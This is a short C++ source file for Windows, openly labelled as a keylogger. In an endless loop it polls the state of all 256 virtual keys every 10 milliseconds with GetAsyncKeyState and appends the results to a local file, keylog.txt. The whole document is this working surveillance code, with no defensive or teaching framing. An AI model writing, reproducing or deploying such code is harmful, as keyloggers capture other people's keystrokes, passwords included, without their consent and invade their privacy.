#include <windows.h>  // Include Windows API header
#include <fstream>    // Include file stream header for file operations

void KeyLogger() {
    char keys[256];  // Array to store key states
    for (int i = 0; i < 256; i++) {
        keys[i] = 0;  // Initialize array to zero
    }

    while (true) {  // Infinite loop to continuously capture keystrokes
        for (int i = 0; i < 256; i++) {
            if (GetAsyncKeyState(i) == -32767) {  // Check if key is pressed
                keys[i] = '1';  // Mark key as pressed
            } else {
                keys[i] = '0';  // Mark key as not pressed
            }
        }

        std::ofstream outFile;  // Create a file stream object
        outFile.open("keylog.txt", std::ios::app);  // Open keylog.txt in append mode
        if (outFile.is_open()) {  // Check if file is open
            for (int i = 0; i < 256; i++) {
                outFile << keys[i];  // Write key state to file
            }
            outFile << std::endl;  // Write a newline character
            outFile.close();  // Close the file
        }

        Sleep(10);  // Pause for 10 milliseconds
    }
}

int main() {
    KeyLogger();  // Call the KeyLogger function
    return 0;  // Return 0 to indicate successful execution
}